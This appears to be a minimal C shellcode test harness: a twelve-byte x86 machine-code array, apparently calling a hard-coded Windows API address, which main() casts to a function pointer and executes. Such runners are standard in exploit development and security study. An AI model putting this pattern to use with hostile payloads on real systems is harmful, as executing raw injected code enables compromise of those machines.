char code[] = "\x68\x87\x4c\x80\x7c\xb8"
              "\x6d\x13\x86\x7c\xff\xd0";


int main(int argc, char **argv)
{
  
  int (*func)();
  func = (int (*)()) code;
  (int)(*func)();
}

